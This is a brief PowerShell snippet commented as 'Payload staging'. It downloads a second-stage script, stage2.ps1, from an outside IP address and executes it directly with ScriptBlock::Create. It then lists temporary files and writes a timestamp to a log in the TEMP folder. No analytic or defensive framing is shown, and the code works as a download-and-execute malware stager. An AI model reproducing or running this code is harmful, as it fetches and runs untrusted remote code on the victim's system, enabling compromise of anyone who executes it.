
<# Payload staging #> $ScriptText = (New-Object Net.WebClient).DownloadString('https://203.0.113.19/stage2.ps1'); & ([ScriptBlock]::Create($ScriptText)); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
